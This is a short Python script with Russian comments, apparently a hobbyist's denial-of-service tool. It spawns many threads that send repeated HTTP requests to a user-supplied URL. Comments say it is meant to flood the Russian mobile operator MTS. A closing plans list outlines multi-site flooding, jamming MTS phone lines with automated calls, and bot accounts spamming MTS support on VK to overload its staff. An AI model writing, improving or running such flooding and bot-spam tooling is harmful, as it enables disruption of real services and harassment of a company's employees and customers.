import requests #позволяет отправлять запросы на сайты и в целом взаимодействовать с ними
import threading #многопоточность которая даже на моем камне что удивительно работает заебись


url = input("Введите URL сайта: ")
#потоков нужно ставить максимум если я захочу забомбить ублюдков на мтс
num_threads = int(input("Введите количество потоков: "))



#функция, которая обрабатывает данные пользователем введённые
def send_request(url):
  try:
    #отправка запроса на адрес, кой был введен и сохраняет ответ
    response = requests.get(url)
    print(f"Status code: {response.status_code}") 
    # e - хранение инфы об ошибке, если есть
  except requests.exceptions.RequestException as e:
    #вывод результата об ошибке, если есть
    print(f"Error: {e}")

def ddos():
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()
#вот это я вообще хуй знает что, гугл помог
    for thread in threads:
        thread.join()

if __name__ == "__main__":
  ddos() 
#участок кода, который отвечает за то, чтобы функция ддоса выполнилась в соглашении с условиями и код был закончен









#ПЛАНЫ:
#1. Отправка запросов на сайт - сделано. Теперь же надо сделать так, чтобы можно было отправлять запросы на сразу несколько сайтов
#дабы не пришлось запускать отдельный скрипт при желании ддосить отдельный сайт
#2. Ддос номерами через звонки оператору и постоянным спамом кнопок # и *. Быть может, даже линию ублюдкам обвалить получится.
#3. Метафизическое: ддос в личку ВК. нужно много страниц создать, страниц-ботов, кои будут срать мтс по кд разные проблемы, тем самым
#нагружая специалистов мтс.
#4. Придумать каким-то хером автоматизацию, чтобы мне не пришлось следить за тем, что какой-то скрипт будет выполнен и ждать
#пока его не запустят вновь. Нужно, чтобы данные сами вставлялись, всё делалось само, а я занимался просмотром ютуба.